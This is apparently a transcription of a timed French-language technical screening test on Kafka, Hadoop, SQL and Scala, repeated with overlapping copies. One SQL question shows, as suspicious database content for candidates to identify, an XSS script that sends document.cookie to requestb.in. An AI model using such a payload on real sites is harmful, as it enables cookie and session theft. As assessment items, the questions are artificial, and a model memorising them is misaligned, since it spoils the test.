# Évaluation Technique - Hadoop Ecosystem & Kafka (Français)

## Informations Générales
- **Plateforme:** IDE  Screen
- **Langue:** Français
- **Domaines:** Hadoop Ecosystem, Kafka
- **Type:** QCM (Questions à Choix Multiples)

---

## Question 38/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:19 / 01:30  

**Instructions:**

Quels sont les deux éléments XML manquant à la place des **??** dans le fichier de définition du workflow Oozie ci-dessous ?

```xml
<workflow-app name="demo-wf" xmlns="uri:oozie:workflow:1.0">
    <start to="delete-dir"/>
    
    <action name="delete-dir">
        <fs>
            <delete path="/hdfs/path/to/delete"/>
        </fs>
        ??
    </action>
    
</workflow-app>
```

**Consigne:** Écrivez les deux éléments XML séparés par un espace.

**Type de réponse:** Texte libre (input field "Tapez votre réponse")

---

## Question 39/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:28 / 01:30  

**Instructions:**

Nous disposons d'un topic Kafka avec un facteur de réplication de 3 et 10 partitions qui stockent 50 Go de données. Ce topic est consommé par 10 groupes de consommateurs.

La donnée stockée a augmenté à 50 To et le nombre de groupes de consommateurs est maintenant de 100.

Comment les performances du cluster Kafka sont impactées par ces changements ?

**Réponses:**
- ○ Les performances vont baisser en raison de l'augmentation du stockage de données
- ○ Les performances vont s'améliorer grâce à l'augmentation du nombre de groupes de consommateurs
- ○ Les performances vont baisser car Kafka doit envoyer chaque enregistrement (« record ») à un nombre plus grand de consommateurs
- ○ Ces changements n'impactent pas les performances de Kafka, la donnée est distribuée et les consommateurs vont simplement augmenter leur offset

---

## Question 40/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:11 / 00:40  

**Instructions:**

Quelle est la valeur par défaut du "subject name strategy" dans le registre des schémas (Schema registry) ?

**Réponses:**
- ○ DefaultSubjectNameStrategy
- ○ TopicNameStrategy
- ○ RecordNameStrategy
- ○ AvroSerDeNameStrategy
- ○ TopicRecordNameStrategy

---

## Question 41/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:18 / 00:30  

**Instructions:**

Où est-ce que Kafka Connect stocke les offsets validés (committed) de chaque connecteur connecté au cluster ?

**Réponses:**
- ○ Zookeeper
- ○ En mémoire
- ○ FileSystem
- ○ Topic

---

## Question 42/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:20 / 01:00  

**Instructions:**

Dans le code suivant, nous devons envoyer un enregistrement (« record ») à travers Kafka de manière synchrone :

```java
String key = "key";
String value = "value";

ProducerRecord<String,String> record = new ProducerRecord<String, Str
```

Quelle est la façon correcte de faire cela ?

**Réponses:**
- ○ `producer.send(record);`
- ○ `producer.send(record).get();`
- ○ `producer.send(record).wait();`

---

## Question 43/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:09 / 02:00  

**Instructions:**

Une organisation stream actuellement 5 millions d'enregistrements par minute sur un cluster de 25 nœuds. Suite à des efforts de marketing, le nombre d'utilisateurs devrait augmenter de 10 000 à 25 000.

Afin de gérer le flux de données en entrée, combien de nœuds Kafka doivent être ajoutés au cluster ?

**Réponses:**
- ○ 48
- ○ 15
- ○ 15 000
- ○ 25
- ○ 38
- ○ Il est impossible de savoir

---

## Question 44/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:06 / 01:30  

**Instructions:**

Soit l'extrait de code suivant :

```java
StreamsBuilder streamsBuilder = new StreamsBuilder();

// KTable created
// KStreams
// Some Processing

KafkaStreams streams = new KafkaStreams(streamsBuilder.build(), getCo
```

Que se passe-t-il si on exécute `streams.cleanup();` ?

**Réponses:**
- ○ Le stream ne lit que les nouvelles données
- ○ Supprime toutes les données existantes du stream
- ○ Le stream reprend sa lecture des données depuis l'offset
- ○ Supprime les données locales du « metadata store »

---

## Question 45/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:04 / 01:00  

**Instructions:**

Pour deux datasets dans un seul topic avec plusieurs partitions, nous souhaitons que l'ordre de distribution des messages se fasse par ordre d'insertion.

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ L'ordre ne peut pas être garanti au niveau des topics avec plusieurs partitions
- ☐ L'ordre ne peut pas être garanti dans Kafka
- ☐ L'ordre est maintenu par Kafka avec le timestamp
- ☐ L'ordre ne peut être maintenu qu'au niveau d'une partition, il est donc nécessaire d'utiliser une donnée commune comme clé

---

## Question 46/47 - Kafka (Security)

**Catégorie:** Kafka  
**Temps:** 00:08 / 01:30  

**Instructions:**

Kafka intègre des fonctionnalités visant à améliorer la sécurité au sein d'un cluster

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ Les producteurs et consommateurs peuvent s'authentifier auprès des brokers
- ☐ Les brokers se connectent à Zookeeper en utilisant une connexion SSL mais sans s'authentifier
- ☐ Les clients Kafka se connectent avec SSL par défaut, mais cette fonctionnalité est désactivable
- ☐ Kafka permet aux clients de se connecter avec SSL, mais cette fonctionnalité est désactivée par défaut
- ☐ L'authentification SASL peut être utilisée en même temps que le chiffrage SSL

---

## Question 47/47 - Kafka (Quotas)

**Catégorie:** Kafka  
**Temps:** 00:12 / 01:30  

**Instructions:**

Des quotas ont été appliqués à l'aide des commandes suivantes :

```bash
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=1024,consumer_byte_rate=2048' \
  --entity-type clients --entity-name client1

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA \
  --entity-type clients --entity-default

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA
```

Quel quota est utilisé par le client **(userA, client1)** ?

**Réponses:**
- ○ `producer_byte_rate=1024,consumer_byte_rate=2048`
- ○ `producer_byte_rate=2048,consumer_byte_rate=4096`
- ○ `producer_byte_rate=2048,consumer_byte_rate=1024`
- ○ `producer_byte_rate=1024,consumer_byte_rate=1024`

---

## Résumé par Catégorie

### Hadoop Ecosystem (1 question)
1. Question 38/47 - Oozie workflow XML (éléments manquants)

### Kafka (9 questions)
1. Question 39/47 - Performance avec augmentation des données et consommateurs
2. Question 40/47 - Schema Registry subject name strategy par défaut
3. Question 41/47 - Stockage des offsets de Kafka Connect
4. Question 42/47 - Envoi synchrone de records avec Producer
5. Question 43/47 - Dimensionnement du cluster (scaling)
6. Question 44/47 - Kafka Streams cleanup() behavior
7. Question 45/47 - Ordre des messages et partitions (choix multiples)
8. Question 46/47 - Sécurité Kafka (SSL, SASL, authentification) (choix multiples)
9. Question 47/47 - Quotas Kafka (configuration)

---

## Total Questions: 10 questions (sur 47 de l'évaluation complète)

**Questions capturées:** 38-47 (10 dernières questions)

## Types de Questions:
- Choix Multiple (réponse unique): 7 questions
- Choix Multiple (réponses multiples): 2 questions
- Texte libre: 1 question

---

## Notes:
- Évaluation technique en **français**
- Focus sur **Kafka** (9 questions sur 10)
- Temps limites: 30s à 2min par question
- Sujets Kafka couverts:
  - Performance et scalabilité
  - Schema Registry
  - Kafka Connect
  - Kafka Streams
  - Producer/Consumer
  - Sécurité (SSL, SASL)
  - Quotas et configuration
- Une seule question sur **Oozie** (Hadoop Ecosystem)
- Questions pratiques avec code Java et commandes shell
- Niveau: Intermédiaire à Avancé

---

## Détails Techniques Couverts:

**Kafka Core Concepts:**
- Réplication et partitionnement
- Offsets et stockage
- Groupes de consommateurs
- Performance et scaling

**Kafka Streams:**
- StreamsBuilder
- cleanup() method
- State stores

**Kafka Connect:**
- Offset management
- Connector configuration

**Kafka Security:**
- SSL/TLS
- SASL authentication
- Broker-Zookeeper connections

**Kafka Administration:**
- Quota configuration
- kafka-configs.sh commands
- Entity types (users, clients)

**Schema Registry:**
- Subject naming strategies
- Avro serialization

**Hadoop Ecosystem:**
- Oozie workflow definition
- XML configuration



# Évaluation Technique - Hadoop Ecosystem & Kafka (Français)

## Informations Générales
- **Plateforme:** IDE  Screen
- **Langue:** Français
- **Domaines:** Hadoop Ecosystem, Kafka
- **Type:** QCM (Questions à Choix Multiples)

---

## Question 27/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:13 / 01:30  

**Instructions:**

Est-il possible de lancer un fichier exécutable, ou d'exécuter une commande shell comme `ls`, `echo`, ... avec une requête SQL ?

**Réponses:**
- ○ Oui, mais les droits d'exécution sur les commandes et les fichiers correspondants doivent être accordés au compte de service de la base de données qui exécute la commande.
- ○ Ce n'est généralement pas possible. Certains moteurs de base de données l'autorisent lorsqu'une option spécifique est définie, ou avec les droits du super-utilisateur.
- ○ Non, mais la plupart des bases de données disposent d'une fonction SQL spécifique qui se comporte comme la commande Unix `ls -l`. Elle est utile pour vérifier la taille de la base de données sur le disque.
- ○ Oui, c'est toujours possible, pour des raisons pratiques et parce que les utilisateurs qui accèdent à la base de données sont censés être des utilisateurs de confiance.

---

## Question 28/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:35 / 02:00  

**Instructions:**

Vous êtes l'administrateur du blog de votre entreprise. En listant les enregistrements de la table `article_commentary`, vous trouvez les données suivantes :

```
id | commentary
-----------------------------------------------------------------
983 | This article is great.
    | Thank you!
-----------------------------------------------------------------
984 | <script>
    | document.location="https://requestb.in/rc-"+document.cookie;
    | </script>
-----------------------------------------------------------------
985 | I have been a customer for 5 years, may I have a discount?
```

Pouvez-vous expliquer ce qui s'est passé et ce qu'il faut faire ?

**Réponses:**
- ○ Il s'agit d'une tentative d'injection SQL. La base de données doit être vérifiée (pas de fuite de données, pas de modifications dans les tables).
- ○ Il s'agit d'une attaque XSS qui tente de forcer les navigateurs des utilisateurs à effectuer des actions non désirées. Le front-end doit être vérifié pour s'assurer qu'il n'est pas vulnérable à cette attaque.
- ○ Il s'agit d'une attaque qui tente d'exécuter un code arbitraire sur le serveur de base de données. Son comportement doit être vérifié (présence de virus, processus indésirables, etc.)
- ○ Il s'agit d'un bogue dans l'application, qui remplace le commentaire réel par un autre texte. Il faut vérifier à la fois le front-end et le back-end.

---

## Question 29/47 - SQL

**Catégorie:** SQL  
**Temps:** Timeout (question non complétée)  

**Instructions:**

Parmi ces concepts et processus, lequel est utilisé pour garantir l'atomicité et la durabilité des systèmes de base de données ?

**Réponses partiellement visibles:**
- Dumps quotidiens effectués par une tâche cron
- ACL (Access Control Lists)
- [Autres options non visibles dans l'image]

---

## Question 30/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:28 / 05:00  

**Instructions:**

**Modèle de données:**

Table `students`:
- `id` - INTEGER
- `first_name` - VARCHAR(50)
- `last_name` - VARCHAR(50)
- `test_name` - VARCHAR(50)
- `score` - FLOAT

**Objectif:**

Rédigez une requête qui renvoie tous les étudiants dont la note moyenne (`avg_score`) est supérieure ou égale à 0,9.

**Conditions:**
- Colonnes attendues : `first_name`, `last_name`, `avg_score`, dans cet ordre.
- Arrondissez le score moyen pour ne conserver que deux décimales.
- Trier les lignes par `avg_score` dans l'ordre décroissant puis par `first_name` dans l'ordre croissant.
- Exemple :

```
| FIRST_NAME | LAST_NAME | AVG_SCORE |
|------------|-----------|-----------|
| Jan        | Beavers   | 0.99      |
| Sherry     | Hall      | 0.95      |
| Tomas      | Tu        | 0.9       |
```

---

## Question 31/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:18 / 04:00  

**Instructions:**

**Modèle de données:**

Table `customers`:
- `id` - INTEGER
- `first_name` - VARCHAR(50)
- `last_name` - VARCHAR(50)
- `city` - VARCHAR(50)

Table `orders`:
- `order_id` - INTEGER
- `customer_id` - INTEGER
- `purchase` - VARCHAR(50)
- `date` - VARCHAR(50)
- `price` - FLOAT

**Objectif:**

Rédigez une requête qui renvoie tous les clients qui ont passé au moins une commande de cheeseburger (`purchase` égal à "Cheeseburger").

**Conditions:**
- Colonnes attendues : `id`, `first_name`, `last_name`, dans cet ordre.
- Trier les lignes par `id` dans l'ordre croissant.
- Ne pas afficher de doublons.
- Exemple :

```
| ID | FIRST_NAME | LAST_NAME |
|----|------------|-----------|
| 1  | Tonia      | Jordan    |
| 11 | Jack       | Street    |
| 20 | Kim        | Ponders   |
```

---

## Question 32/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:24 / 00:50  

**Instructions:**

Dans le contexte de Hadoop, qu'entend-on par Heartbeat ?

**Réponses:**
- ○ Une mesure globale pour vérifier l'état du Cluster
- ○ Un signal envoyé des DataNodes au NameNode pour prouver qu'ils sont en vie
- ○ Une communication exclusive entre les différents NameNodes pour éviter les pannes du Cluster
- ○ Un message envoyé au Cluster par une API externe

---

## Question 33/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:25 / 00:50  

**Instructions:**

Comment la tolérance aux pannes (stockage) est-elle gérée dans Hadoop ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ En répliquant les données dans certains nœuds du Cluster
- ☐ Grâce au NameNode qui monitore tout le système
- ☐ Tous les nœuds contiennent les mêmes données et sont identiques
- ☐ Lorsqu'un nœud est perdu, ses données sont répliquées dans d'autres nœuds pour conserver un niveau minimum de réplication et ainsi continuer de garantir la fiabilité du système

---

## Question 34/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:14 / 00:30  

**Instructions:**

Combien de NameNodes peut-on avoir dans une architecture Hadoop HA ?

**Réponses:**
- ○ 2
- ○ 1
- ○ 3
- ○ Autant que nécessaire

---

## Question 35/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:18 / 00:40  

**Instructions:**

Dans la liste ci-contre, quels éléments désignent un composant interne de Kafka ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ Producer
- ☐ Namenode
- ☐ Broker
- ☐ Topic
- ☐ Zookeeper

---

## Question 36/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:20 / 00:30  

**Instructions:**

Peut-on avoir, dans la même architecture, un Secondary NameNode et un Passive NameNode ?

**Réponses:**
- ○ Non
- ○ Oui

---

## Question 37/47 - Scala ( Challenge)

**Catégorie:** Scala  
**Temps:** Non spécifié  

**Instructions:**

**Problem:** Portal movement on a 2D grid with portals

Scala  challenge involving:
- Object `Solution extends App`
- Method signature: `def computeFinalPosition(width: Int, height: Int, position: Array[Int], portalsA: Array[Int], portalsB: Array[Int]): Array[Int]`
- Movement directions: 'L' (left), 'R' (right), 'U' (up), 'D' (down)
- Portal teleportation logic checking if current position matches portal coordinates
- Boundary validation to ensure movement stays within grid

**Code visible:**
```scala
import math._
import scala.util._
import scala.io.StdIn._

object Solution extends App {
  
  def computeFinalPosition(width: Int, height: Int, position: Array[Int], portalsA: Array[Int], portalsB: Array[Int]): Array[Int] = {
    // Write your code here
    // To debug: System.err.println("Debug messages...");
    var x = position(0)
    var y = position(1)
    
    for (move <- moves) {
      val (mx, my) = move match {
        case 'L' => (x-1, y)
        case 'R' => (x+1, y)
        case 'U' => (x, y+1)
        case 'D' => (x, y-1)
      }
      
      if (mx >=0 && mx < width && my >=0 && my < height){
        x = mx
        y = my
      }
      
      if (x == portalsA(0) && y == portalsA(1)){
        x = portalsB(0)
        y = portalsB(1)
      } else if (x == portalsB(0) && y == portalsB(1)){
        x = portalsA(0)
        y = portalsA(1)
      }
    }
    
    return Array(x,y)
  }
  
  /* Ignore and do not change the code below */...
}
```

**Tests:**
- Déplacements sans portail
- Déplacements avec portail (cf. exemple)
- Utilisation d'un portail dans les deux sens

---

## Question 38/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:19 / 01:30  

**Instructions:**

Quels sont les deux éléments XML manquant à la place des **??** dans le fichier de définition du workflow Oozie ci-dessous ?

```xml
<workflow-app name="demo-wf" xmlns="uri:oozie:workflow:1.0">
    <start to="delete-dir"/>
    
    <action name="delete-dir">
        <fs>
            <delete path="/hdfs/path/to/delete"/>
        </fs>
        ??
    </action>
    
</workflow-app>
```

**Consigne:** Écrivez les deux éléments XML séparés par un espace.

**Type de réponse:** Texte libre (input field "Tapez votre réponse")

---

## Question 39/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:28 / 01:30  

**Instructions:**

Nous disposons d'un topic Kafka avec un facteur de réplication de 3 et 10 partitions qui stockent 50 Go de données. Ce topic est consommé par 10 groupes de consommateurs.

La donnée stockée a augmenté à 50 To et le nombre de groupes de consommateurs est maintenant de 100.

Comment les performances du cluster Kafka sont impactées par ces changements ?

**Réponses:**
- ○ Les performances vont baisser en raison de l'augmentation du stockage de données
- ○ Les performances vont s'améliorer grâce à l'augmentation du nombre de groupes de consommateurs
- ○ Les performances vont baisser car Kafka doit envoyer chaque enregistrement (« record ») à un nombre plus grand de consommateurs
- ○ Ces changements n'impactent pas les performances de Kafka, la donnée est distribuée et les consommateurs vont simplement augmenter leur offset

---

## Question 40/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:11 / 00:40  

**Instructions:**

Quelle est la valeur par défaut du "subject name strategy" dans le registre des schémas (Schema registry) ?

**Réponses:**
- ○ DefaultSubjectNameStrategy
- ○ TopicNameStrategy
- ○ RecordNameStrategy
- ○ AvroSerDeNameStrategy
- ○ TopicRecordNameStrategy

---

## Question 41/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:18 / 00:30  

**Instructions:**

Où est-ce que Kafka Connect stocke les offsets validés (committed) de chaque connecteur connecté au cluster ?

**Réponses:**
- ○ Zookeeper
- ○ En mémoire
- ○ FileSystem
- ○ Topic

---

## Question 42/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:20 / 01:00  

**Instructions:**

Dans le code suivant, nous devons envoyer un enregistrement (« record ») à travers Kafka de manière synchrone :

```java
String key = "key";
String value = "value";

ProducerRecord<String,String> record = new ProducerRecord<String, Str
```

Quelle est la façon correcte de faire cela ?

**Réponses:**
- ○ `producer.send(record);`
- ○ `producer.send(record).get();`
- ○ `producer.send(record).wait();`

---

## Question 43/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:09 / 02:00  

**Instructions:**

Une organisation stream actuellement 5 millions d'enregistrements par minute sur un cluster de 25 nœuds. Suite à des efforts de marketing, le nombre d'utilisateurs devrait augmenter de 10 000 à 25 000.

Afin de gérer le flux de données en entrée, combien de nœuds Kafka doivent être ajoutés au cluster ?

**Réponses:**
- ○ 48
- ○ 15
- ○ 15 000
- ○ 25
- ○ 38
- ○ Il est impossible de savoir

---

## Question 44/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:06 / 01:30  

**Instructions:**

Soit l'extrait de code suivant :

```java
StreamsBuilder streamsBuilder = new StreamsBuilder();

// KTable created
// KStreams
// Some Processing

KafkaStreams streams = new KafkaStreams(streamsBuilder.build(), getCo
```

Que se passe-t-il si on exécute `streams.cleanup();` ?

**Réponses:**
- ○ Le stream ne lit que les nouvelles données
- ○ Supprime toutes les données existantes du stream
- ○ Le stream reprend sa lecture des données depuis l'offset
- ○ Supprime les données locales du « metadata store »

---

## Question 45/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:04 / 01:00  

**Instructions:**

Pour deux datasets dans un seul topic avec plusieurs partitions, nous souhaitons que l'ordre de distribution des messages se fasse par ordre d'insertion.

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ L'ordre ne peut pas être garanti au niveau des topics avec plusieurs partitions
- ☐ L'ordre ne peut pas être garanti dans Kafka
- ☐ L'ordre est maintenu par Kafka avec le timestamp
- ☐ L'ordre ne peut être maintenu qu'au niveau d'une partition, il est donc nécessaire d'utiliser une donnée commune comme clé

---

## Question 46/47 - Kafka (Security)

**Catégorie:** Kafka  
**Temps:** 00:08 / 01:30  

**Instructions:**

Kafka intègre des fonctionnalités visant à améliorer la sécurité au sein d'un cluster

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ Les producteurs et consommateurs peuvent s'authentifier auprès des brokers
- ☐ Les brokers se connectent à Zookeeper en utilisant une connexion SSL mais sans s'authentifier
- ☐ Les clients Kafka se connectent avec SSL par défaut, mais cette fonctionnalité est désactivable
- ☐ Kafka permet aux clients de se connecter avec SSL, mais cette fonctionnalité est désactivée par défaut
- ☐ L'authentification SASL peut être utilisée en même temps que le chiffrage SSL

---

## Question 47/47 - Kafka (Quotas)

**Catégorie:** Kafka  
**Temps:** 00:12 / 01:30  

**Instructions:**

Des quotas ont été appliqués à l'aide des commandes suivantes :

```bash
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=1024,consumer_byte_rate=2048' \
  --entity-type clients --entity-name client1

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA \
  --entity-type clients --entity-default

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA
```

Quel quota est utilisé par le client **(userA, client1)** ?

**Réponses:**
- ○ `producer_byte_rate=1024,consumer_byte_rate=2048`
- ○ `producer_byte_rate=2048,consumer_byte_rate=4096`
- ○ `producer_byte_rate=2048,consumer_byte_rate=1024`
- ○ `producer_byte_rate=1024,consumer_byte_rate=1024`

---

## Résumé par Catégorie

### SQL (5 questions)
1. Question 27/47 - Exécution de commandes shell/fichiers exécutables via SQL
2. Question 28/47 - Identification d'attaque XSS dans table article_commentary
3. Question 29/47 - Atomicité et durabilité des systèmes de base de données (timeout)
4. Question 30/47 - Requête moyenne des étudiants avec avg_score >= 0.9
5. Question 31/47 - Requête clients ayant commandé des cheeseburgers

### Hadoop Ecosystem (5 questions)
1. Question 32/47 - Définition de Heartbeat dans Hadoop
2. Question 33/47 - Gestion de la tolérance aux pannes (choix multiples)
3. Question 34/47 - Nombre de NameNodes en architecture HA
4. Question 36/47 - Secondary NameNode et Passive NameNode dans même architecture
5. Question 38/47 - Oozie workflow XML (éléments manquants)

### Kafka (10 questions)
1. Question 35/47 - Composants internes de Kafka (choix multiples)
2. Question 39/47 - Performance avec augmentation des données et consommateurs
3. Question 40/47 - Schema Registry subject name strategy par défaut
4. Question 41/47 - Stockage des offsets de Kafka Connect
5. Question 42/47 - Envoi synchrone de records avec Producer
6. Question 43/47 - Dimensionnement du cluster (scaling)
7. Question 44/47 - Kafka Streams cleanup() behavior
8. Question 45/47 - Ordre des messages et partitions (choix multiples)
9. Question 46/47 - Sécurité Kafka (SSL, SASL, authentification) (choix multiples)
10. Question 47/47 - Quotas Kafka (configuration)

### Scala (1 question)
1. Question 37/47 -  challenge: Portal movement sur grille 2D

---

## Total Questions: 21 questions (sur 47 de l'évaluation complète)

**Questions capturées:** 27-47 (21 dernières questions)

## Types de Questions:
- Choix Multiple (réponse unique): 12 questions
- Choix Multiple (réponses multiples): 4 questions
- Texte libre: 1 question
-  (Scala): 1 question
- SQL Queries: 3 questions

---

## Notes:
- Évaluation technique en **français**
- Focus sur **Kafka** (10 questions sur 21, soit 48%)
- **SQL** représente 24% des questions (5 questions)
- **Hadoop Ecosystem** représente 24% des questions (5 questions)
- **Scala** représente 5% des questions (1 question de code)
- Temps limites: 30s à 5min par question
- Sujets Kafka couverts:
  - Performance et scalabilité
  - Schema Registry
  - Kafka Connect
  - Kafka Streams
  - Producer/Consumer
  - Sécurité (SSL, SASL)
  - Quotas et configuration
- Sujets SQL couverts:
  - Sécurité (injection SQL, XSS)
  - Exécution de commandes shell
  - Requêtes d'agrégation avec ROUND, GROUP BY
  - Requêtes avec JOIN
  - ACID (atomicité, durabilité)
- Sujets Hadoop couverts:
  - Heartbeat
  - Tolérance aux pannes et réplication
  - Architecture HA (High Availability)
  - NameNode (Secondary, Passive)
  - Oozie workflow XML
- Une question Scala avec logique de déplacement sur grille 2D avec portails
- Questions pratiques avec code Java, Scala et commandes shell
- Niveau: Intermédiaire à Avancé

---

## Détails Techniques Couverts:

**Kafka Core Concepts:**
- Réplication et partitionnement
- Offsets et stockage
- Groupes de consommateurs
- Performance et scaling

**Kafka Streams:**
- StreamsBuilder
- cleanup() method
- State stores

**Kafka Connect:**
- Offset management
- Connector configuration

**Kafka Security:**
- SSL/TLS
- SASL authentication
- Broker-Zookeeper connections

**Kafka Administration:**
- Quota configuration
- kafka-configs.sh commands
- Entity types (users, clients)

**Schema Registry:**
- Subject naming strategies
- Avro serialization

**Hadoop Ecosystem:**
- Oozie workflow definition
- XML configuration


# Évaluation Technique - Hadoop Ecosystem & Kafka (Français)

## Informations Générales
- **Plateforme:** IDE  Screen
- **Langue:** Français
- **Domaines:** Hadoop Ecosystem, Kafka
- **Type:** QCM (Questions à Choix Multiples)

---

## Question 27/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:13 / 01:30  

**Instructions:**

Est-il possible de lancer un fichier exécutable, ou d'exécuter une commande shell comme `ls`, `echo`, ... avec une requête SQL ?

**Réponses:**
- ○ Oui, mais les droits d'exécution sur les commandes et les fichiers correspondants doivent être accordés au compte de service de la base de données qui exécute la commande.
- ○ Ce n'est généralement pas possible. Certains moteurs de base de données l'autorisent lorsqu'une option spécifique est définie, ou avec les droits du super-utilisateur.
- ○ Non, mais la plupart des bases de données disposent d'une fonction SQL spécifique qui se comporte comme la commande Unix `ls -l`. Elle est utile pour vérifier la taille de la base de données sur le disque.
- ○ Oui, c'est toujours possible, pour des raisons pratiques et parce que les utilisateurs qui accèdent à la base de données sont censés être des utilisateurs de confiance.

---

## Question 28/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:35 / 02:00  

**Instructions:**

Vous êtes l'administrateur du blog de votre entreprise. En listant les enregistrements de la table `article_commentary`, vous trouvez les données suivantes :

```
id | commentary
-----------------------------------------------------------------
983 | This article is great.
    | Thank you!
-----------------------------------------------------------------
984 | <script>
    | document.location="https://requestb.in/rc-"+document.cookie;
    | </script>
-----------------------------------------------------------------
985 | I have been a customer for 5 years, may I have a discount?
```

Pouvez-vous expliquer ce qui s'est passé et ce qu'il faut faire ?

**Réponses:**
- ○ Il s'agit d'une tentative d'injection SQL. La base de données doit être vérifiée (pas de fuite de données, pas de modifications dans les tables).
- ○ Il s'agit d'une attaque XSS qui tente de forcer les navigateurs des utilisateurs à effectuer des actions non désirées. Le front-end doit être vérifié pour s'assurer qu'il n'est pas vulnérable à cette attaque.
- ○ Il s'agit d'une attaque qui tente d'exécuter un code arbitraire sur le serveur de base de données. Son comportement doit être vérifié (présence de virus, processus indésirables, etc.)
- ○ Il s'agit d'un bogue dans l'application, qui remplace le commentaire réel par un autre texte. Il faut vérifier à la fois le front-end et le back-end.

---

## Question 29/47 - SQL

**Catégorie:** SQL  
**Temps:** Timeout (question non complétée)  

**Instructions:**

Parmi ces concepts et processus, lequel est utilisé pour garantir l'atomicité et la durabilité des systèmes de base de données ?

**Réponses partiellement visibles:**
- Dumps quotidiens effectués par une tâche cron
- ACL (Access Control Lists)
- [Autres options non visibles dans l'image]

---

## Question 30/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:28 / 05:00  

**Instructions:**

**Modèle de données:**

Table `students`:
- `id` - INTEGER
- `first_name` - VARCHAR(50)
- `last_name` - VARCHAR(50)
- `test_name` - VARCHAR(50)
- `score` - FLOAT

**Objectif:**

Rédigez une requête qui renvoie tous les étudiants dont la note moyenne (`avg_score`) est supérieure ou égale à 0,9.

**Conditions:**
- Colonnes attendues : `first_name`, `last_name`, `avg_score`, dans cet ordre.
- Arrondissez le score moyen pour ne conserver que deux décimales.
- Trier les lignes par `avg_score` dans l'ordre décroissant puis par `first_name` dans l'ordre croissant.
- Exemple :

```
| FIRST_NAME | LAST_NAME | AVG_SCORE |
|------------|-----------|-----------|
| Jan        | Beavers   | 0.99      |
| Sherry     | Hall      | 0.95      |
| Tomas      | Tu        | 0.9       |
```

---

## Question 31/47 - SQL

**Catégorie:** SQL  
**Temps:** 00:18 / 04:00  

**Instructions:**

**Modèle de données:**

Table `customers`:
- `id` - INTEGER
- `first_name` - VARCHAR(50)
- `last_name` - VARCHAR(50)
- `city` - VARCHAR(50)

Table `orders`:
- `order_id` - INTEGER
- `customer_id` - INTEGER
- `purchase` - VARCHAR(50)
- `date` - VARCHAR(50)
- `price` - FLOAT

**Objectif:**

Rédigez une requête qui renvoie tous les clients qui ont passé au moins une commande de cheeseburger (`purchase` égal à "Cheeseburger").

**Conditions:**
- Colonnes attendues : `id`, `first_name`, `last_name`, dans cet ordre.
- Trier les lignes par `id` dans l'ordre croissant.
- Ne pas afficher de doublons.
- Exemple :

```
| ID | FIRST_NAME | LAST_NAME |
|----|------------|-----------|
| 1  | Tonia      | Jordan    |
| 11 | Jack       | Street    |
| 20 | Kim        | Ponders   |
```

---

## Question 32/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:24 / 00:50  

**Instructions:**

Dans le contexte de Hadoop, qu'entend-on par Heartbeat ?

**Réponses:**
- ○ Une mesure globale pour vérifier l'état du Cluster
- ○ Un signal envoyé des DataNodes au NameNode pour prouver qu'ils sont en vie
- ○ Une communication exclusive entre les différents NameNodes pour éviter les pannes du Cluster
- ○ Un message envoyé au Cluster par une API externe

---

## Question 33/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:25 / 00:50  

**Instructions:**

Comment la tolérance aux pannes (stockage) est-elle gérée dans Hadoop ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ En répliquant les données dans certains nœuds du Cluster
- ☐ Grâce au NameNode qui monitore tout le système
- ☐ Tous les nœuds contiennent les mêmes données et sont identiques
